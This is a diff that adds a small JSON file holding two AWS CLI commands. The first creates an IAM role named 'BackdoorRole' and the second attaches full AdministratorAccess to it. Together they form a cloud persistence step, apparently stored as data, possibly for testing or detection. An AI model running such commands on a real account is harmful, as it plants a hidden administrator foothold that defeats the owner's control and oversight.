@@ -1,0 +1,4 @@
+[
+  "aws iam create-role --role-name BackdoorRole --assume-role-policy-document file://trust-policy.json",
+  "aws iam attach-role-policy --role-name BackdoorRole --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+]
